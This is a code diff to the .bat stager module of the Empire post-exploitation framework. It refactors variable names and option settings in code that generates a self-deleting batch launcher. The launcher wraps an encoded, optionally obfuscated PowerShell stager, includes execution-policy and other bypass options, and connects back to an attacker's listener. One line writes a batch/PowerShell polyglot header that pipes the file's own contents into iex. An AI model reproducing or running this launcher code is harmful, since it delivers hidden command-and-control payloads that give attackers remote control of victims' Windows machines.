@@ -12,7 +12,7 @@ class Stager(object):
 
             'Author': ['@harmj0y'],
 
-            'Description': ('Generates a self-deleting .bat launcher for Empire.'),
+            'Description': 'Generates a self-deleting .bat launcher for Empire.',
 
             'Comments': [
                 ''
@@ -31,7 +31,9 @@ class Stager(object):
             'Language': {
                 'Description': 'Language of the stager to generate.',
                 'Required': True,
-                'Value': 'powershell'
+                'Value': 'powershell',
+                'SuggestedValues': ['powershell'],
+                'Strict': True
             },
             'StagerRetries': {
                 'Description': 'Times for the stager to retry connecting.',
@@ -98,26 +100,27 @@ class Stager(object):
 
         # extract all of our options
         language = self.options['Language']['Value']
-        listenerName = self.options['Listener']['Value']
+        listener_name = self.options['Listener']['Value']
         delete = self.options['Delete']['Value']
         obfuscate = self.options['Obfuscate']['Value']
-        obfuscateCommand = self.options['ObfuscateCommand']['Value']
-        userAgent = self.options['UserAgent']['Value']
+        obfuscate_command = self.options['ObfuscateCommand']['Value']
+        user_agent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
-        stagerRetries = self.options['StagerRetries']['Value']
+        proxy_creds = self.options['ProxyCreds']['Value']
+        stager_retries = self.options['StagerRetries']['Value']
         bypasses = self.options['Bypasses']['Value']
 
-        obfuscateScript = False
+        obfuscate_script = False
         if obfuscate.lower() == "true":
-            obfuscateScript = True
+            obfuscate_script = True
 
         # generate the launcher code including escapes for % characters needed for .bat files
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True,
-                                                           obfuscate=obfuscateScript,
-                                                           obfuscationCommand=obfuscateCommand, userAgent=userAgent,
-                                                           proxy=proxy, proxyCreds=proxyCreds,
-                                                           stagerRetries=stagerRetries, bypasses=bypasses).replace("%", "%%")
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language, encode=True,
+                                                           obfuscate=obfuscate_script,
+                                                           obfuscationCommand=obfuscate_command, userAgent=user_agent,
+                                                           proxy=proxy, proxyCreds=proxy_creds,
+                                                           stagerRetries=stager_retries, bypasses=bypasses).replace("%",
+                                                                                                                   "%%")
 
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
@@ -132,7 +135,5 @@ class Stager(object):
             else:
                 code = '# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & POPD /B\n'
             code += launcher + "\n"
-
-
 
             return code
